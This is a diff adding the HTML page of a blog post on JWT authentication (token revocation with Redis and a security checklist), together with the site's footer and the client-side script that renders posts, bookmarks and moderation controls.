+<pre><code class="language-python">async def revoke_token(jti: str, remaining_seconds: int):
+    await redis_client.setex(f&quot;revoked_jti:{jti}&quot;, remaining_seconds, &quot;true&quot;)
+
+async def is_token_revoked(jti: str) -&gt; bool:
+    return await redis_client.exists(f&quot;revoked_jti:{jti}&quot;) == 1
+</code></pre>
+<hr>
+<h2 id="sec-4-summary-checklist">Summary Checklist</h2>
+<ol>
+<li>Store tokens exclusively in <strong>HttpOnly, Secure, SameSite=Strict</strong> cookies.</li>
+<li>Limit Access Token lifespans to under 15 minutes.</li>
+<li>Rotate Refresh Tokens on every single exchange to detect reuse attacks.</li>
+<li>Maintain a Redis blacklist for immediate security revocations.</li>
+</ol>
+
+      </article>
+
+      <div class="ad-slot" aria-label="Advertisement" style="margin-top:3.5rem"><span>Advertisement</span></div>
+
+      <!-- Author Box -->
+      <div id="author-box" class="article-author-card">
+        <div class="author-card-inner">
+          <div class="author-card-bio-group">
+            <div id="author-avatar" class="author-avatar-box">✍️</div>
+            <div>
+              <span class="label" style="margin-bottom:4px">Written By</span>
+              <h3 id="author-name" style="margin:0;font-size:1.35rem">Muhammad Shahzeb Malik</h3>
+              <p id="author-bio" class="muted" style="margin-top:0.35rem;font-size:0.95rem">Independent engineer publishing open research on zebMalik.tech.</p>
+            </div>
+          </div>
+          <div style="display:flex;gap:0.75rem;align-items:center">
+            <a href="/write" class="btn">Write &amp; Get Paid &rarr;</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- Recommended Next Reads (Related Articles) -->
+      <section id="related-articles-section" class="related-articles-section">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:0.75rem">
+          <div>
+            <span class="label" style="margin-bottom:4px">Continue Reading</span>
+            <h3 style="margin:0;font-size:1.35rem">Recommended Next Reads</h3>
+          </div>
+          <a href="/blog" class="arrow-link" style="font-size:13.5px">Explore all &rarr;</a>
+        </div>
+        <div id="related-cards-grid" class="related-cards-grid">
+      <a href="/posts/ollama-pydantic-structured-json-function-calling/" class="related-card">
+        <span class="related-card-category">🌐 Data Engineering &amp; Pipelines</span>
+        <h4 class="related-card-title">Stop Burning Ai Credits: Reliable Local Function Calling with Ollama and Pydantic</h4>
+        <div class="related-card-meta">
+          <span>Sep 29, 2026</span> &bull; <span>3 min read</span>
+        </div>
+      </a>
+      <a href="/posts/ai-phones-are-changing-from-smart-assistants-to-phones-that-can-actually-take-action/" class="related-card">
+        <span class="related-card-category">🌐 Data Engineering &amp; Pipelines</span>
+        <h4 class="related-card-title">AI Phones Are Changing: From Smart Assistants to Phones That Can Actually Take Action</h4>
+        <div class="related-card-meta">
+          <span>Sep 26, 2026</span> &bull; <span>9 min read</span>
+        </div>
+      </a>
+      <a href="/posts/the-future-of-smartphones/" class="related-card">
+        <span class="related-card-category">🌐 Data Engineering &amp; Pipelines</span>
+        <h4 class="related-card-title">The Future Of Smartphones</h4>
+        <div class="related-card-meta">
+          <span>Sep 26, 2026</span> &bull; <span>5 min read</span>
+        </div>
+      </a></div>
+      </section>
+
+      <!-- Mobile/Tablet Tools Strip (Visible on smaller viewports where sidebar is hidden) -->
+      <div class="mobile-tools-card">
+        <span class="label">Explore Tools</span>
+        <h4 style="margin:4px 0 10px 0;font-size:1.05rem">Free In-Browser Developer &amp; PDF Tools</h4>
+        <p class="muted" style="font-size:0.88rem;margin-bottom:12px">100% private, client-side browser utilities built by zebMalik.tech.</p>
+        <div style="display:flex;flex-wrap:wrap;gap:8px">
+          <a href="/image-compressor" class="chip" style="text-decoration:none">Image Compressor</a>
+          <a href="/merge-pdf" class="chip" style="text-decoration:none">Merge PDF</a>
+          <a href="/qr-code-generator" class="chip" style="text-decoration:none">QR Code</a>
+          <a href="/json-formatter" class="chip" style="text-decoration:none">JSON Formatter</a>
+          <a href="/tools" class="chip" style="text-decoration:none;background:var(--accent);color:#fff;font-weight:600">All 22 Tools &rarr;</a>
+        </div>
+      </div>
+    </main>
+
+    <!-- Right Column: Wikipedia-style Infobox & Sidebar -->
+    <aside class="reader-right-col">
+      <div class="infobox-card">
+        <div class="infobox-header">
+          <span class="infobox-badge">Quick Facts</span>
+          <h4 id="info-card-title">Modern JWT Authentication Archit...</h4>
+        </div>
+        <table class="infobox-table">
+          <tbody>
+            <tr>
+              <th>Author</th>
+              <td id="info-author">Muhammad Shahzeb Malik</td>
+            </tr>
+            <tr>
+              <th>Published</th>
+              <td id="info-date">Sep 19, 2026</td>
+            </tr>
+            <tr>
+              <th>Read Time</th>
+              <td id="info-readtime">2 min</td>
+            </tr>
+            <tr>
+              <th>Category</th>
+              <td id="info-category">Data Engineering &amp; Pipelines</td>
+            </tr>
+            <tr>
+              <th>Verified Reads</th>
+              <td id="info-views">195 reads</td>
+            </tr>
+            <tr>
+              <th>Platform</th>
+              <td>zebMalik.tech</td>
+            </tr>
+            <tr>
+              <th>Monetization</th>
+              <td style="color:var(--accent);font-weight:600">Partner Program (Paid per Read)</td>
+            </tr>
+          </tbody>
+        </table>
+        <div style="margin-top:1.25rem;padding-top:0.75rem;border-top:1px solid var(--line)">
+          <a href="/write" class="btn" style="width:100%;justify-content:center;font-size:13px;padding:9px 12px">Write &amp; Get Paid Monthly &rarr;</a>
+        </div>
+      </div>
+
+      <div class="ad-slot" aria-label="Advertisement" style="margin-top:1.5rem"><span>Advertisement</span></div>
+
+      <div class="infobox-card" style="margin-top:1.5rem">
+        <div class="infobox-header">
+          <span class="infobox-badge">Free Tools</span>
+          <h4>Run 100% in Browser</h4>
+        </div>
+        <div class="infobox-links">
+          <a href="/image-compressor">&rarr; Image Compressor</a>
+          <a href="/merge-pdf">&rarr; Merge PDF Files</a>
+          <a href="/qr-code-generator">&rarr; QR Code Generator</a>
+          <a href="/ai-chatbot-rag">&rarr; AI Chatbot &amp; RAG Systems</a>
+          <a href="/tools" style="font-weight:600;color:var(--accent);border-bottom:none">&rarr; Browse all 22 tools</a>
+        </div>
+      </div>
+    </aside>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <div class="fcols">
+      <div class="about">
+        <div class="brand">zebMalik<em>.tech</em></div>
+        <p>An engineering team building data extraction, automation and AI systems. Written scope, fixed prices, code handed over.</p>
+      </div>
+      <div>
+        <h4>Services</h4>
+        <a href="/services#extraction">Data extraction</a>
+        <a href="/services#automation">AI &amp; automation</a>
+        <a href="/services#backend">Backend engineering</a>
+        <a href="/services#dataops">Data operations</a>
+      </div>
+      <div>
+        <h4>Solutions</h4>
+        <a href="/ecommerce-price-monitoring">Price monitoring</a>
+        <a href="/lead-list-building">Lead list building</a>
+        <a href="/ai-chatbot-rag">AI chatbots &amp; RAG</a>
+        <a href="/free-sample">Free sample</a>
+      </div>
+      <div>
+        <h4>Company</h4>
+        <a href="/about">About</a>
+        <a href="/work">Work</a>
+        <a href="/blog">Blog &amp; Research</a>
+        <a href="/write">Write &amp; Get Paid</a>
+        <a href="/pricing">Pricing</a>
+        <a href="/contact">Contact</a>
+      </div>
+      <div>
+        <h4>Elsewhere</h4>
+        <a href="https://github.com/MuhammadShahzebMalik786">GitHub</a>
+        <a href="https://www.linkedin.com/in/muhammad-shahzeb-malik/">LinkedIn</a>
+        <a href="https://muhammadshahzeb.dev">Portfolio</a>
+        <a href="https://www.fiverr.com/maliksahahb/build-n8n-automation-ai-agents-and-ai-workflow-automation">Fiverr &mdash; n8n &amp; AI Agents</a>
+        <a href="https://www.fiverr.com/maliksahahb/build-an-ai-chatbot-rag-agent-and-ai-assistant-for-your-data">Fiverr &mdash; AI Chatbot &amp; RAG</a>
+        <a href="https://www.trustpilot.com/review/zebmalik.tech" target="_blank" rel="noopener noreferrer">Trustpilot &mdash; Reviews &amp; Rating</a>
+      </div>
+    </div>
+    <div class="ftools">
+      <div class="ftools-head">
+        <h4>Free Browser Tools</h4>
+        <a href="/tools">Browse all 22 tools &rarr;</a>
+      </div>
+      <div class="ftools-grid">
+        <div class="ftools-group image-group">
+          <h5>Image Tools</h5>
+          <div class="ftools-subgrid">
+            <div>
+              <a href="/image-compressor">Image compressor</a>
+              <a href="/image-resizer">Image resizer</a>
+              <a href="/image-converter">Image converter</a>
+              <a href="/image-to-pdf">Image to PDF</a>
+              <a href="/pdf-to-image">PDF to image</a>
+            </div>
+            <div>
+              <a href="/image-metadata-remover">Metadata remover</a>
+              <a href="/image-cropper">Image cropper</a>
+              <a href="/image-rotator">Rotate images</a>
+              <a href="/image-watermark">Image watermark</a>
+              <a href="/meme-generator">Meme generator</a>
+            </div>
+          </div>
+        </div>
+        <div class="ftools-group">
+          <h5>PDF Tools</h5>
+          <a href="/merge-pdf">Merge PDF</a>
+          <a href="/split-pdf">Split PDF</a>
+          <a href="/compress-pdf">Compress PDF</a>
+          <a href="/extract-text-from-pdf">PDF to text &amp; OCR</a>
+          <a href="/pdf-organizer">Organize PDF pages</a>
+          <a href="/watermark-pdf">Watermark PDF</a>
+          <a href="/pdf-page-numbers">Add page numbers</a>
+          <a href="/rotate-pdf">Rotate PDF</a>
+        </div>
+        <div class="ftools-group">
+          <h5>Developer &amp; Utilities</h5>
+          <a href="/qr-code-generator">QR code generator</a>
+          <a href="/json-formatter">JSON formatter</a>
+          <a href="/word-counter">Word counter</a>
+          <a href="/password-generator">Password generator</a>
+        </div>
+      </div>
+    </div>
+    <div class="fbot">
+      <div>&copy; <span id="yr">2026</span> zebMalik<span class="tech-mark">.tech</span> &nbsp;&middot;&nbsp; <a href="/privacy" style="color:inherit;text-decoration:underline;">Privacy Policy</a> &nbsp;&middot;&nbsp; <a href="/terms" style="color:inherit;text-decoration:underline;">Terms of Service</a> &nbsp;&middot;&nbsp; <a href="https://www.trustpilot.com/evaluate/zebmalik.tech" target="_blank" rel="noopener noreferrer" style="color:inherit;text-decoration:underline;">Review on Trustpilot</a></div>
+      <div>Built and maintained in Pakistan &middot; Working across US, UK and EU hours</div>
+    </div>
+  </div>
+</footer>
+
+<script>document.getElementById('yr').textContent=new Date().getFullYear();</script>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<script src="/blog-config.js?v=12"></script>
+<script src="/cmd-palette.js?v=2"></script>
+<script>
+document.addEventListener('DOMContentLoaded', async function () {
+  // Robust Bookmark Storage Engine with local fallback
+  function getBookmarksSafe() {
+    if (typeof ZebBlog !== 'undefined' && ZebBlog.getBookmarks) return ZebBlog.getBookmarks();
+    try { return JSON.parse(localStorage.getItem('zebmalik_blog_bookmarks') || '[]'); } catch (_) { return []; }
+  }
+  function isBookmarkedSafe(s) {
+    if (typeof ZebBlog !== 'undefined' && ZebBlog.isBookmarked) return ZebBlog.isBookmarked(s);
+    return getBookmarksSafe().indexOf(s) !== -1;
+  }
+  function toggleBookmarkSafe(s) {
+    if (typeof ZebBlog !== 'undefined' && ZebBlog.toggleBookmark) return ZebBlog.toggleBookmark(s);
+    if (!s) return false;
+    var list = getBookmarksSafe();
+    var idx = list.indexOf(s);
+    var added = false;
+    if (idx !== -1) { list.splice(idx, 1); added = false; }
+    else { list.unshift(s); added = true; }
+    try { localStorage.setItem('zebmalik_blog_bookmarks', JSON.stringify(list)); } catch (_) {}
+    return added;
+  }
+
+  function showToast(msg) {
+    var toast = document.getElementById('reader-toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.id = 'reader-toast';
+      toast.className = 'reader-toast';
+      toast.style.cssText = 'position:fixed;bottom:28px;left:50%;transform:translateX(-50%) translateY(24px) scale(0.96);background:#181a1f;color:#ffffff;padding:10px 22px;border-radius:9999px;font-size:13.5px;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-weight:500;box-shadow:0 14px 40px rgba(0,0,0,0.38);border:1px solid rgba(255,255,255,0.15);z-index:999999;opacity:0;pointer-events:none;transition:transform 0.22s cubic-bezier(0.16,1,0.3,1),opacity 0.2s ease;display:none;align-items:center;gap:8px;white-space:nowrap;max-width:90vw;';
+      document.body.appendChild(toast);
+    }
+
+    var isDark = document.documentElement.getAttribute('data-theme') === 'dark';
+    toast.style.background = isDark ? '#232730' : '#181a1f';
+    toast.style.color = isDark ? '#f0f2f5' : '#ffffff';
+    toast.style.borderColor = isDark ? '#3b404d' : 'rgba(255,255,255,0.15)';
+
+    toast.innerHTML = msg;
+    toast.style.display = 'flex';
+    // Trigger reflow for animation
+    toast.offsetHeight;
+    toast.classList.add('is-visible');
+    toast.style.opacity = '1';
+    toast.style.pointerEvents = 'auto';
+    toast.style.transform = 'translateX(-50%) translateY(0) scale(1)';
+
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(function () {
+      toast.classList.remove('is-visible');
+      toast.style.opacity = '0';
+      toast.style.pointerEvents = 'none';
+      toast.style.transform = 'translateX(-50%) translateY(24px) scale(0.96)';
+      setTimeout(function () {
+        if (!toast.classList.contains('is-visible')) {
+          toast.style.display = 'none';
+        }
+      }, 250);
+    }, 2800);
+  }
+
+  var params = new URLSearchParams(window.location.search);
+  var slug = params.get('slug');
+  if (!slug && window.location.pathname.includes('/posts/')) {
+    var match = window.location.pathname.match(/\/posts\/([^\/]+)/);
+    if (match) slug = decodeURIComponent(match[1]);
+  }
+  var isPrerendered = document.body.getAttribute('data-prerendered') === 'true';
+
+  if (!isPrerendered && !slug) {
+    document.getElementById('post-title').textContent = 'Article not found';
+    document.getElementById('post-content').innerHTML = '<p>No article specified. <a href="/blog">Browse all articles</a>.</p>';
+    return;
+  }
+
+  try {
+    var post = window.__POST_DATA__ || null;
+    if (!post && slug) {
+      post = await ZebBlog.fetchPostBySlug(slug);
+    }
+    if (!post && !isPrerendered) {
+      document.getElementById('post-title').textContent = 'Article Not Found';
+      document.getElementById('post-content').innerHTML = '<p>This article does not exist or is pending review. <a href="/blog">Return to Blog</a>.</p>';
+      return;
+    }
+
+    if (!isPrerendered) {
+      document.title = post.title + ' — zebMalik.tech Blog';
+      document.getElementById('post-title').textContent = post.title;
+    
+    var authorName = post.profiles ? post.profiles.full_name : 'Author';
+    var readDate = post.published_at ? new Date(post.published_at).toLocaleDateString(undefined, {month:'long', day:'numeric', year:'numeric'}) : '';
+    
+    // Dynamic SEO Metadata for Search Engines (Googlebot & Bing)
+    try {
+      var metaDesc = document.querySelector('meta[name="description"]');
+      if (metaDesc && post.excerpt) metaDesc.content = post.excerpt;
+
+      var ogTitle = document.querySelector('meta[property="og:title"]');
+      if (ogTitle) ogTitle.content = post.title + ' — zebMalik.tech Blog';
+
+      var ogDesc = document.querySelector('meta[property="og:description"]');
+      if (ogDesc && post.excerpt) ogDesc.content = post.excerpt;
+
+      var ogUrl = document.querySelector('meta[property="og:url"]');
+      if (ogUrl) ogUrl.content = 'https://zebmalik.tech/post?slug=' + encodeURIComponent(post.slug);
+
+      var twTitle = document.querySelector('meta[name="twitter:title"]');
+      if (twTitle) twTitle.content = post.title + ' — zebMalik.tech Blog';
+
+      var twDesc = document.querySelector('meta[name="twitter:description"]');
+      if (twDesc && post.excerpt) twDesc.content = post.excerpt;
+
+      // Inject Google BlogPosting JSON-LD Schema
+      var schemaScript = document.createElement('script');
+      schemaScript.type = 'application/ld+json';
+      schemaScript.textContent = JSON.stringify({
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "headline": post.title,
+        "description": post.excerpt || post.title,
+        "image": post.cover_image_url ? [post.cover_image_url] : ["https://zebmalik.tech/android-chrome-512x512.png"],
+        "datePublished": post.published_at,
+        "dateModified": post.updated_at || post.published_at,
+        "author": [{
+          "@type": "Person",
+          "name": authorName,
+          "url": "https://zebmalik.tech/about"
+        }],
+        "publisher": {
+          "@type": "Organization",
+          "name": "zebMalik.tech",
+          "url": "https://zebmalik.tech"
+        },
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://zebmalik.tech/post?slug=" + encodeURIComponent(post.slug)
+        }
+      });
+      document.head.appendChild(schemaScript);
+    } catch (_) {}
+    
+    // Render Article Content (supports rich visual HTML with multiple inline images or Markdown)
+    var rawContent = post.content_markdown || '';
+    var wordCount = rawContent.replace(/<[^>]*>/g, ' ').split(/\s+/).filter(Boolean).length;
+    var readMinutes = Math.max(1, Math.round(wordCount / 200));
+    window.currentPostReadMinutes = readMinutes;
+
+    document.getElementById('post-meta').textContent = (post.tags && post.tags.length ? post.tags.join(' · ') : 'Research');
+    var authorBylineHtml = (post.profiles && post.profiles.username) ? '<a href="/author?u=' + encodeURIComponent(post.profiles.username) + '" style="color:inherit;text-decoration:none;border-bottom:1px dotted var(--line-2)" title="View Author Profile">' + authorName + '</a>' : authorName;
+    var isBm = isBookmarkedSafe(post.slug);
+    var bmBtnHtml = '<button type="button" id="post-byline-bm" class="btn-bookmark' + (isBm ? ' is-bookmarked' : '') + '" title="' + (isBm ? 'Remove bookmark' : 'Save article for later') + '" aria-label="Bookmark article">' +
+      '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>' +
+      '<span>' + (isBm ? 'Saved' : 'Save') + '</span>' +
+    '</button>';
+    document.getElementById('post-byline').innerHTML = '<span>By <strong>' + authorBylineHtml + '</strong></span><span>•</span><span>' + readDate + '</span><span>•</span><span>' + readMinutes + ' min read</span><span>•</span><span>' + (post.view_count || 0) + ' reads</span><span>•</span>' + bmBtnHtml;
+
+    var coverUrl = post.cover_image_url;
+    if (post.slug === 'building-production-rag-systems-python' && (!coverUrl || coverUrl.includes('1677442136019-21780efad99a'))) {
+      coverUrl = '/rag-systems-architecture.webp';
+    }
+    if (coverUrl) {
+      document.getElementById('post-cover-wrapper').style.display = 'block';
+      document.getElementById('post-cover').innerHTML = '<img class="post-cover-img" src="' + coverUrl + '" alt="' + post.title + '" onerror="this.onerror=null;this.src=\'/rag-systems-architecture.webp\';">';
+    }
+
+    // Auto-sync fix to Supabase database if logged-in author or admin views the article
+    if (post.slug === 'building-production-rag-systems-python' && post.cover_image_url !== 'https://zebmalik.tech/rag-systems-architecture.webp') {
+      try {
+        var sb = ZebBlog.getClient();
+        ZebBlog.getCurrentUser().then(function(user) {
+          if (user && (user.id === post.author_id || user.email === 'malikshahzebabd@gmail.com' || user.id === 'c3735295-8408-44ea-a4d8-b5f4b5077358')) {
+            sb.from('posts').update({ cover_image_url: 'https://zebmalik.tech/rag-systems-architecture.webp' }).eq('id', post.id).then(function() {
+              console.log('[ZebBlog] Cover image database record auto-updated to rag-systems-architecture.webp');
+            });
+          }
+        });
+      } catch (_) {}
+    }
+
+    if (post.profiles) {
+      var authorNameEl = document.getElementById('author-name');
+      if (authorNameEl) {
+        if (post.profiles.username) {
+          authorNameEl.innerHTML = '<a href="/author?u=' + encodeURIComponent(post.profiles.username) + '" style="color:inherit;text-decoration:none;border-bottom:1px dotted var(--line-2)" title="View Author Profile">' + (post.profiles.full_name || 'Engineering Contributor') + '</a>';
+        } else {
+          authorNameEl.textContent = post.profiles.full_name || 'Engineering Contributor';
+        }
+      }
+      if (post.profiles.bio) document.getElementById('author-bio').textContent = post.profiles.bio;
+      if (post.profiles.avatar_url) {
+        document.getElementById('author-avatar').innerHTML = '<img src="' + post.profiles.avatar_url + '" alt="' + (post.profiles.full_name || 'Author') + '" style="width:100%;height:100%;object-fit:cover">';
+      } else if (post.profiles.full_name) {
+        document.getElementById('author-avatar').textContent = post.profiles.full_name.charAt(0).toUpperCase();
+      }
+    }
+
+    var parsedHtml = rawContent.trim().startsWith('<') ? rawContent : (window.marked ? window.marked.parse(rawContent) : '');
+    var safeHtml = (typeof ZebBlog !== 'undefined' && ZebBlog.sanitizeHtml) ? ZebBlog.sanitizeHtml(parsedHtml) : parsedHtml;
+    if (safeHtml) {
+      document.getElementById('post-content').innerHTML = safeHtml;
+    } else {
+      document.getElementById('post-content').textContent = rawContent;
+    }
+
+    // Enhance links inside article content (open external in new tab safely)
+    document.querySelectorAll('#post-content a').forEach(function(a) {
+      if (a.hostname && a.hostname !== window.location.hostname) {
+        a.setAttribute('target', '_blank');
+        a.setAttribute('rel', 'noopener noreferrer');
+      }
+    });
+
+    // Dev.to-style Code Block Enhancer (Terminal container, language badge, 1-click copy)
+    function enhanceCodeBlocks() {
+      var pres = document.querySelectorAll('#post-content pre');
+      pres.forEach(function(pre) {
+        if (pre.closest('.code-block-card')) return;
+        
+        var codeEl = pre.querySelector('code');
+        var textContent = (codeEl ? codeEl.innerText : pre.innerText) || '';
+        var lang = 'CODE';
+
+        var classNames = ((pre.className || '') + ' ' + (codeEl ? codeEl.className || '' : '')).trim();
+        var match = classNames.match(/language-([a-zA-Z0-9_+#]+)/i);
+        if (match) {
+          lang = match[1].toUpperCase();
+        } else if (classNames.includes('ql-syntax')) {
+          if (/\b(def|import|from|print\()\b/.test(textContent)) lang = 'PYTHON';
+          else if (/<[a-z][\s\S]*>/i.test(textContent)) lang = 'HTML';
+          else if (/\b(const|let|var|function|console\.log|=>)\b/.test(textContent)) lang = 'JAVASCRIPT';
+          else if (/\b(SELECT|FROM|WHERE|INSERT|UPDATE)\b/i.test(textContent)) lang = 'SQL';
+          else if (/^(\$|npm|pnpm|yarn|git|docker)\b/m.test(textContent)) lang = 'BASH';
+          else if (/\{[\s\S]*:[\s\S]*\}/.test(textContent) && textContent.trim().startsWith('{')) lang = 'JSON';
+        }
+
+        var card = document.createElement('div');
+        card.className = 'code-block-card';
+
+        var header = document.createElement('div');
+        header.className = 'code-block-header';
+
+        var meta = document.createElement('div');
+        meta.className = 'code-block-meta';
+        meta.innerHTML = '<span class="code-terminal-dots"><span></span><span></span><span></span></span>' +
+                         '<span class="code-lang-badge">' + lang + '</span>';
+
+        var copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.type = 'button';
+        copyBtn.setAttribute('aria-label', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> <span>Copy</span>';
+
+        copyBtn.addEventListener('click', function() {
+          var snippet = codeEl ? codeEl.innerText : pre.innerText;
+          var doSuccess = function() {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> <span>Copied!</span>';
+            setTimeout(function() {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> <span>Copy</span>';
+            }, 2000);
+          };
+
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(snippet).then(doSuccess).catch(function() {
+              fallbackCopy(snippet, doSuccess);
+            });
+          } else {
+            fallbackCopy(snippet, doSuccess);
+          }
+        });
+
+        function fallbackCopy(text, cb) {
+          var ta = document.createElement('textarea');
+          ta.value = text;
+          ta.style.position = 'fixed';
+          ta.style.top = '-9999px';
+          document.body.appendChild(ta);
+          ta.select();
+          try {
+            document.execCommand('copy');
+            cb();
+          } catch(e) {}
+          document.body.removeChild(ta);
+        }
+
+        header.appendChild(meta);
+        header.appendChild(copyBtn);
+
+        pre.parentNode.insertBefore(card, pre);
+        card.appendChild(header);
+        card.appendChild(pre);
+      });
+    }
+    enhanceCodeBlocks();
+
+    // Populate Right-hand Infobox
+    var infoTitle = document.getElementById('info-card-title');
+    if (infoTitle) infoTitle.textContent = post.title.length > 34 ? post.title.substring(0, 32) + '...' : post.title;
+    var infoAuth = document.getElementById('info-author');
+    if (infoAuth) {
+      if (post.profiles && post.profiles.username) {
+        infoAuth.innerHTML = '<a href="/author?u=' + encodeURIComponent(post.profiles.username) + '" style="color:inherit;text-decoration:underline" title="View Author Profile">' + authorName + '</a>';
+      } else {
+        infoAuth.textContent = authorName;
+      }
+    }
+    var infoDate = document.getElementById('info-date');
+    if (infoDate) infoDate.textContent = readDate || 'Recent';
+    var infoTime = document.getElementById('info-readtime');
+    if (infoTime) infoTime.textContent = readMinutes + ' min';
+    var infoCat = document.getElementById('info-category');
+    if (infoCat) infoCat.textContent = post.category || post.category_label || (post.tags && post.tags.length ? post.tags[0] : 'Engineering');
+    var infoViews = document.getElementById('info-views');
+    if (infoViews) infoViews.textContent = (post.view_count || 0) + ' reads';
+    } // End if (!isPrerendered)
+
+    // Enhance links inside article content (open external in new tab safely)
+    document.querySelectorAll('#post-content a').forEach(function(a) {
+      if (a.hostname && a.hostname !== window.location.hostname) {
+        a.setAttribute('target', '_blank');
+        a.setAttribute('rel', 'noopener noreferrer');
+      }
+    });
+
+    enhanceCodeBlocks();
+
+    // Build Wikipedia-style Table of Contents
+    buildTableOfContents();
+
+    // Author & Admin Moderation Shields
+    var currentUser = null;
+    var currentProfile = null;
+    try {
+      if (typeof ZebBlog !== 'undefined' && ZebBlog.getCurrentUser) {
+        currentUser = await ZebBlog.getCurrentUser();
+        if (currentUser && ZebBlog.fetchAuthorProfile) {
+          currentProfile = await ZebBlog.fetchAuthorProfile(currentUser.id);
+        }
+      }
+    } catch(e){}
+    var isAuthor = currentUser && (currentUser.id === post.author_id);
+    var isAdmin = (currentProfile && currentProfile.is_admin) || (currentUser && (currentUser.email === 'malikshahzebabd@gmail.com' || currentUser.id === 'c3735295-8408-44ea-a4d8-b5f4b5077358'));
+    var isUnpublished = (post.status !== 'published');
+
+    if (isUnpublished) {
+      // Hide all ad slots on unapproved articles
+      document.querySelectorAll('.ad-slot').forEach(function(el) { el.style.display = 'none'; });
+
+      if (isAdmin) {
+        var adminNotice = document.createElement('div');
+        adminNotice.className = 'admin-review-banner';
+        adminNotice.style.cssText = 'background:#fff8e6;border:1px solid #ffe082;border-radius:8px;padding:1.25rem 1.75rem;margin:1.5rem 0 1rem 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1.25rem;box-shadow:0 4px 16px rgba(255,152,0,0.12)';
+        adminNotice.innerHTML = '<div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap">' +
+          '<div style="font-size:26px;line-height:1">🛡️</div>' +
+          '<div>' +
+            '<div style="display:flex;align-items:center;gap:10px">' +
+              '<strong style="color:#795548;font-size:1.15rem">Admin Moderation View</strong>' +
+              '<span class="chip" style="background:#ff9800;color:#fff;font-weight:700;font-size:11px;text-transform:uppercase;padding:2px 8px;border-radius:4px">' + post.status + '</span>' +
+            '</div>' +
+            '<p style="margin:4px 0 0 0;font-size:0.92rem;color:#6d4c41">You are previewing this pending article submitted by <strong>' + (post.author ? post.author.full_name : 'Contributor') + '</strong>. Ads &amp; tracking are paused.</p>' +
+          '</div>' +
+        '</div>' +
+        '<div style="display:flex;align-items:center;gap:0.75rem;flex-wrap:wrap">' +
+          '<button id="admin-bar-approve" class="btn" style="background:#2e7d32;border-color:#2e7d32;color:#fff;padding:10px 22px;font-size:14px;font-weight:600;border-radius:6px;cursor:pointer">✓ Approve &amp; Publish</button>' +
+          '<button id="admin-bar-reject" class="btn btn-out" style="color:#c62828;border-color:#c62828;padding:10px 18px;font-size:14px;border-radius:6px;cursor:pointer">✕ Reject</button>' +
+          '<a href="/author-dashboard" class="arrow-link" style="font-size:14px;margin-left:8px;font-weight:600;white-space:nowrap">Dashboard &rarr;</a>' +
+        '</div>';
+
+        var grid = document.querySelector('.reader-grid');
+        if (grid && grid.parentNode) {
+          grid.parentNode.insertBefore(adminNotice, grid);
+        } else {
+          document.getElementById('post-content').parentNode.insertBefore(adminNotice, document.getElementById('post-content'));
+        }
+
+        document.getElementById('admin-bar-approve').onclick = async function() {
+          if (!confirm('Approve this article and publish it live to /blog?')) return;
+          this.disabled = true;
+          this.textContent = 'Publishing…';
+          try {
+            await ZebBlog.adminApprovePost(post.id);
+            alert('✓ Post approved! It is now live on zebMalik.tech.');
+            window.location.reload();
+          } catch(err) {
+            alert('Error approving post: ' + err.message);
+            this.disabled = false;
+            this.textContent = '✓ Approve & Publish';
+          }
+        };
+
+        document.getElementById('admin-bar-reject').onclick = async function() {
+          var reason = prompt('Optional rejection reason / editorial feedback for author:');
+          if (reason === null) return;
+          this.disabled = true;
+          this.textContent = 'Rejecting…';
+          try {
+            await ZebBlog.adminRejectPost(post.id, reason);
+            alert('Post rejected. Redirecting to author dashboard…');
+            window.location.href = 'author-dashboard.html';
+          } catch(err) {
+            alert('Error rejecting post: ' + err.message);
+            this.disabled = false;
+            this.textContent = '✕ Reject';
+          }
+        };
+
+      } else if (isAuthor) {
+        var authorNotice = document.createElement('div');
+        authorNotice.style.cssText = 'background:var(--paper-2);border:1px solid var(--line);color:var(--ink);padding:1rem 1.5rem;border-radius:8px;margin:1.5rem 0 1rem 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:0.75rem';
+        authorNotice.innerHTML = '<span>🔒 <strong>Author Draft Preview:</strong> This article is <code>' + post.status.toUpperCase() + '</code> and not yet public.</span> <a href="/author-dashboard" style="color:var(--accent);font-weight:600;text-decoration:underline">Go to Dashboard &rarr;</a>';
+        var grid = document.querySelector('.reader-grid');
+        if (grid && grid.parentNode) {
+          grid.parentNode.insertBefore(authorNotice, grid);
+        } else {
